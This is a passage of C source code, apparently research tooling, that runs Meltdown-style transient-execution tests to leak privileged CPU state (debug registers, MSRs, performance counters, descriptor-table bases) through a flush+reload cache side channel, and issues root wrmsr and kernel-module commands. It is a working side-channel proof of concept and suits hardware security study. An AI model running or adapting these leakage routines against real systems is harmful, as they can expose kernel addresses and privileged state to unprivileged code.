  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr3\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <= 2) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_dr4(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr4\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <= 2) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_dr5(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr5\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_dr6(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr6\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_dr7(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr7\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_rdfsbase(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "rdfsbase rax\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        if (idx != 0) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
          got_hit++;
        }
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_rdgsbase(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "rdgsbase rax\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        if (idx != 0) {
          printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
          got_hit++;
        }
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_rdmsr(size_t tries, size_t spacing, size_t iterations) {

  int msrs_to_test[] = {0xce,   // MSR_PLATFORM_INFO
                        0xc1,  // PMC0 (arch.)
                        0x0,    // IA32_P5_MC_ADDR (arch.)
                        0x10,   // IA32_TIME_STAMP_COUNTER (arch.) (also on AMD)
                        0x17,   // IA32_PLATFORM_ID (arch.)
                        0xc00001000,   // IA32_FS_BASE (arch.)
                        0x1db,       // Last Branch from IP (AMD)
                        0xc00000e9,   // Inst retired (AMD)
                        0xc00100030  // ProcNameString (AMD)
                        };
  int msrs_to_test_len = sizeof(msrs_to_test) / sizeof(*msrs_to_test);

  for (int i = 0; i < msrs_to_test_len; i++) {
    printf("Testing MSR 0x%x\n", msrs_to_test[i]);
    size_t msr = msrs_to_test[i];
    // flush testarray
    for (size_t c = 0; c < 255; c++) {
      flush(testarray + c * spacing);
    }
    mfence();
    int shift = i;
    for (size_t try = 0; try < tries; try++) {
      for (size_t i = 0; i < iterations; i++) {
        if (!setjmp(trycatch_buf)) {
          // try to leak some byte
          asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
          IMUL_BLOCK
          maccess(0);

          asm volatile(
          INTELASM(
              "xor rax, rax\n\t"
	            "mov r12d, %[shift]\n\t"
              "xor rcx, rcx\n\t"
              "lea r11, [%[testarray]]\n\t"
              "mov rcx, %[msr]\n\t" //
              "rdmsr\n\t"
              "and rax, 0xff0\n\t"
	            "mov cl, r12b\n\t"
	            "shl rax, cl\n\t"
              "add r11, rax\n\t"
              "mov rax, [r11]\n\t"
              "xor rax, rax\n\t"
          )
          : : [testarray]"r"(&testarray), [shift]"r"(shift), [msr]"r"(msr) : "memory", "rdx", "rcx", "rax", "r11");
          try_abort();
        }
        unblock_signal(SIGSEGV);
      }  // for (size_t try = 0; try < tries; try++)

      // check for hits in array
      int got_hit = 0;
      for (size_t i = 0; i < 255; i++) {
        size_t idx = ((i * 167u) + 13u) & 255u;
        size_t delta = flush_reload_t(testarray + idx * spacing);
        if (delta < CACHE_MISS) {
          if (idx != 0) {
            printf("[*] Try %d: Got hit on index 0x%lx (delta: %zu, MSR:0x%x)\n", try, idx, delta, msrs_to_test[i]);
            got_hit++;
          }
        }
      }
      if (got_hit > 0 && got_hit <=2 ) {
        return 1;
      }
    }  // for (size_t i = 0; i < iterations; i++)
  }  // for (int i = 0; i < Pmcs_to_test_len; i++) {
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_str(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  
  for (int shift = 0; shift < 48; shift++) {
    for (size_t try = 0; try < tries; try++) {
      for (size_t i = 0; i < iterations; i++) {
        if (!setjmp(trycatch_buf)) {
          // try to leak some byte
          asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
          IMUL_BLOCK
          maccess(0);

          asm volatile(
          INTELASM(
              "xor rax, rax\n\t"
              "mov ecx, %[shift]\n\t"
              "lea r11, [%[testarray]]\n\t"
              "str rax\n\t"
              "shr rax, cl\n\t" // would be good for a value like: 0xfffffe0000000000
              "and rax, 0xff000\n\t"
              "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
              "add r11, rax\n\t"
              "mov rax, [r11]\n\t"
              "xor rax, rax\n\t"
          )
          : : [testarray]"r"(&testarray), [shift]"r"(shift) : "memory", "rdx", "rcx", "rax", "r11");
          try_abort();
        }
        unblock_signal(SIGSEGV);
      }  // for (size_t try = 0; try < tries; try++)

      // check for hits in array
      int got_hit = 0;
      for (size_t i = 0; i < 255; i++) {
        size_t idx = ((i * 167u) + 13u) & 255u;
        size_t delta = flush_reload_t(testarray + idx * spacing);
        if (delta < CACHE_MISS) {
          printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
          if (idx != 0) got_hit++;
        }
      }
      if (got_hit > 0 && got_hit <=2 ) {
        return 1;
      }
    }
  }  
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}


struct idt {
  void* base;
  uint16_t length;
};

int test_sidt(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  struct idt idt_leak;
  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile ("sidt %0" : "=m"(idt_leak));
        maccess((char*)((size_t)testarray + ((size_t)idt_leak.base) & 0xff000));
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_sldt(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (int shift = 0; shift < 48; shift++) {
    for (size_t try = 0; try < tries; try++) {
      for (size_t i = 0; i < iterations; i++) {
        if (!setjmp(trycatch_buf)) {
          // try to leak some byte
          asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
          IMUL_BLOCK
          maccess(0);

          asm volatile(
          INTELASM(
              "xor rax, rax\n\t"
              "mov ecx, %[shift]\n\t"
              "lea r11, [%[testarray]]\n\t"
              "sldt rax\n\t"
              "shr rax, cl\n\t" // would be good for a value like: 0xfffffe0000000000
              "and rax, 0xff000\n\t"
              "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
              "add r11, rax\n\t"
              "mov rax, [r11]\n\t"
              "xor rax, rax\n\t"
          )
          : : [testarray]"r"(&testarray), [shift]"r"(shift): "memory", "rdx", "rcx", "rax", "r11");
          try_abort();
        }
        unblock_signal(SIGSEGV);
      }  // for (size_t try = 0; try < tries; try++)

      // check for hits in array
      int got_hit = 0;
      for (size_t i = 0; i < 255; i++) {
        size_t idx = ((i * 167u) + 13u) & 255u;
        size_t delta = flush_reload_t(testarray + idx * spacing);
        if (delta < CACHE_MISS) {
          printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
          if (idx != 0) got_hit++;
        }
      }
      if (got_hit > 0 && got_hit <=2 ) {
        return 1;
      }
    }  // for (size_t i = 0; i < iterations; i++)
  }
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}


struct gdt {
  void* base;
  uint16_t length;
};

int test_sgdt(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  struct gdt gdt_leak;
  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile ("sgdt %0" : "=m"(gdt_leak));
        maccess((char*)((size_t)testarray + ((size_t)gdt_leak.base) & 0xff000));
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_smsw(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr7\n\t"
            "smsw rax\n\t" // stores into lower 16 bit only
            "and rax, 0xff\n\t"
            "shl rax, 12\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "lea r11, [%[testarray]]\n\t"
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

void intel_enable_hpc_ctr1() {
  int ret = system("modprobe msr");
  if (ret) {
    log_error_and_exit("modprobe msr failed.");
  }
  ret = system("wrmsr -a 0x38d 0x30");
  if (ret) {
    log_error_and_exit("wrmsr failed (1).");
  }
  ret = system("sudo wrmsr -a 0x38f 0x200000000");
  if (ret) {
    log_error_and_exit("wrmsr failed (2).");
  }
}

void intel_disable_hpc_ctr1() {
  int ret = system("modprobe msr");
  if (ret) {
    log_error_and_exit("modprobe msr failed.");
  }
  ret = system("wrmsr -a 0x38d 0x0");
  if (ret) {
    log_error_and_exit("wrmsr failed (3).");
  }
  ret = system("sudo wrmsr -a 0x38f 0x0");
  if (ret) {
    log_error_and_exit("wrmsr failed (4).");
  }
}

void confirm_disabled_userspace_rdpmc() {
  return;
  FILE* fd = fopen("/sys/devices/cpu/rdpmc", "r");
  if (!fd) {
    log_error_and_exit(
        "Could not open file '/sys/devices/cpu/rdpmc'. Gimme root permissions pls *friendly trustful smile* :)");
  }

  char buf[50] = {0};
  int ret = fread(buf, 1, 1, fd);
  if (!ret) {
    log_error_and_exit("Could not check RDPMC permissions. Aborting!");
  }
  int userspace_disabled = strncmp("1", buf, 50) == 0;
  if (!userspace_disabled) {
    log_error_and_exit(
        "RDPMC is reachable in userspace. Execute 'echo 1 | sudo tee /sys/devices/cpu/rdpmc' to change.\n");
  }
}

int test_rdpmc_amd(size_t tries, size_t spacing, size_t iterations) {
  confirm_disabled_userspace_rdpmc();

  drop_privileges();
  printf("[*] Testing with %zuB spacing and %zu iterations\n", spacing, iterations);
  //size_t spacing = 512;
  //size_t iterations = 5;

  // flush testarray
  for (size_t c = 0; c < 256; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "mov rcx, 0xc1\n\t"
            "rdpmc\n\t"
            "and rax, 0xff00\n\t"
            "lea r11, [%[testarray]]\n\t"
            "shl rax, 1\n\t"  // having this at 1 instead of 2 prevents that we do not report anything if the lowest byte is 0
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t")
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    for (size_t i = 0; i < 256; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) {
          elevate_privileges();
          return 1;
        }
      }
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  elevate_privileges();
  return 0;
}

int test_rdpmc_intel(size_t tries, size_t spacing, size_t iterations) {
  confirm_disabled_userspace_rdpmc();
  if (is_intel_cpu()) {
    intel_enable_hpc_ctr1();
  }

  drop_privileges();
  printf("[*] Testing with %zuB spacing and %zu iterations\n", spacing, iterations);

  // flush testarray
  for (size_t c = 0; c < 256; c++) {
    flush(testarray + c * spacing);
  }
  mfence();
  int shift = 1;
   
  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "mov rcx, 0x40000001\n\t"
            "lea r11, [%[testarray]]\n\t"
	          "mov r12d, %[shift]\n\t"
            "rdpmc\n\t"
            "and rax, 0xff00\n\t"
	          "mov cl, r12b\n\t"
            "shl rax, cl\n\t"
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t")
        : : [testarray]"r"(&testarray), [shift]"r"(shift) : "memory", "rdx", "rcx", "rax", "r11", "r12");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    for (size_t i = 0; i < 256; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) {
          elevate_privileges();
          if (is_intel_cpu()) {
            intel_disable_hpc_ctr1();
          }
          return 1;
        }
      }
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  elevate_privileges();
  if (is_intel_cpu()) {
    intel_disable_hpc_ctr1();
  }
  return 0;
}

void load_pteditor_kmod() {
  system("sudo modprobe pteditor");
}

void unload_pteditor_kmod() {
  system("sudo rmmod pteditor");
}

void load_regcheck_kmod() {
  system("sudo insmod checker-kmod/regcheck.ko");
}

void unload_regcheck_kmod() {
  system("sudo rmmod regcheck");
}

void enable_turbo_boost() {
  system("echo 0 | sudo tee /sys/devices/system/cpu/intel_pstate/no_turbo");
}

void disable_turbo_boost() {
  system("echo 1 | sudo tee /sys/devices/system/cpu/intel_pstate/no_turbo");
}

void enable_prefetchers() {
  system("sudo wrmsr -a 0x1a4 0");
}

void disable_prefetchers() {
  system("sudo wrmsr -a 0x1a4 15");
}

void init() {
  memset(testarray, 1, 256 * PAGESIZE);

  if (is_intel_cpu()) {
    disable_prefetchers();
    disable_turbo_boost();
  }

  CACHE_MISS = detect_flush_reload_threshold() - 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);
  mfence();

  signal(SIGSEGV, trycatch_segfault_handler);
}

void print_installed_hypervisors() {
  printf("Installed Hypervisors:\n");
  system("dpkg -l | grep -E \"kvm|qemu|vmware\"");
}

void print_microcode_version() {
  printf("Microcode Version:\n");
  system("cat /proc/cpuinfo | grep micro | head -n 1");
}

void print_cpu_model() {
  system("lscpu | grep 'Model name'");
}

int main(int argc, char* argv[]) {
  init();

  printf("=====================\n");
  print_cpu_model();
  print_microcode_version();
  print_installed_hypervisors();
  printf("=====================\n");

  if (is_intel_cpu()) {
    log_info("Detected Intel CPU\n");
  } else if (is_amd_cpu()) {
    log_info("Detected AMD CPU\n");
  } else {
    log_error_and_exit("[-] Unsupported CPU\n");
  }

  if (is_intel_cpu()) {
    if (CHECK(test_rdpmc_intel(2000, 1048, 5))) {
      log_success("RDPMC leakage verified!");
    } else {
      log_warning("RDPMC leakage not verified!");
    }
  }
  if (is_amd_cpu()) {
    if (CHECK(test_rdpmc_amd(2000, 1048, 5))) {
      log_success("RDPMC leakage verified!");
    } else {
      log_warning("RDPMC leakage not verified!");
    }
  }

  if (CHECK(test_rdmsr(2000, 4096, 5))) {
    log_success("RDMSR leakage verified!");
  } else {
    log_warning("RDMSR leakage not verified!");
  }

  disable_rdtsc();
  pthread_t counting_thread_t = start_counting_thread();
  libsc_pin_to_core(0, 1);
  // executing 3 times to leave a trace in the logs on whether the results are stable
  detect_flush_reload_threshold_counting_thread();
  detect_flush_reload_threshold_counting_thread();
  CACHE_MISS_COUNTING_THREAD = detect_flush_reload_threshold_counting_thread();
  printf("Cache miss (CT) @ %zd\n", CACHE_MISS_COUNTING_THREAD);
  if (CHECK(test_rdtsc(2000, 1024, 5))) {
    log_success("RDTSC leakage verified!");
  } else {
    log_warning("RDTSC leakage not verified!");
  }
  if (CHECK(test_rdtscp(2000, 4096, 5))) {
    log_success("RDTSCP leakage verified!");
  } else {
    log_warning("RDTSCP leakage not verified!");
  }
  stop_counting_thread(counting_thread_t);
  enable_rdtsc();

  if (CHECK(test_cr0(2000, 4096, 5))) {
    log_success("CR0 leakage verified!");
  } else {
    log_warning("CR0 leakage not verified!");
  }

  if (CHECK(test_cr1(2000, 4096, 5))) {
    log_success("CR1 leakage verified!");
  } else {
    log_warning("CR1 leakage not verified!");
  }

  if (CHECK(test_cr2(2000, 4096, 5))) {
    log_success("CR2 leakage verified!");
  } else {
    log_warning("CR2 leakage not verified!");
  }

  if (CHECK(test_cr3(2000, 4096, 5))) {
    log_success("CR3 leakage verified!");
  } else {
    log_warning("CR3 leakage not verified!");
  }

